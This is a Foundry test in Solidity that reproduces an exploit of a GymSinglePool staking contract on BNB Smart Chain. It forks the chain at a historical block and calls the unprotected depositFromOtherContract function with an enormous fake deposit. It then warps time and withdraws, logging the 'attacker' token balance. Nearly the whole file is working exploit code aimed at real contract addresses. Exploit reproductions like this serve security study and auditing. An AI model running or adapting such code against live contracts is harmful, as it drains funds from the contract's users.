// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20} from "src/interfaces/IERC20.sol";

import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";

interface GymToken {
    function approve(
        address spender,
        uint256 rawAmount
    ) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

interface GymSinglePool {
    function depositFromOtherContract(
        uint256 _depositAmount,
        uint8 _periodId,
        bool isUnlocked,
        address _from
    ) external;

    function withdraw(uint256 _depositId) external;
}

contract ContractTest is Test {
    IPancakeRouter pancakeRouter =
        IPancakeRouter(payable(0x6CD71A07E72C514f5d511651F6808c6395353968));
    GymToken gymnet = GymToken(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);
    GymSinglePool gympool =
        GymSinglePool(0xA8987285E100A8b557F06A7889F79E0064b359f2);

    function setUp() public {
        vm.createSelectFork("bsc", 18_501_049); //fork bsc at block 18501049
    }

    function testExploit() public {
        gympool.depositFromOtherContract(
            8_000_000_000_000_000_000_000_666,
            0,
            true,
            address(this)
        );
        vm.warp(1_654_683_789);
        gympool.withdraw(0);
        emit log_named_uint(
            "Exploit completed, GYMNET balance of attacker:",
            gymnet.balanceOf(address(this))
        );
    }
}
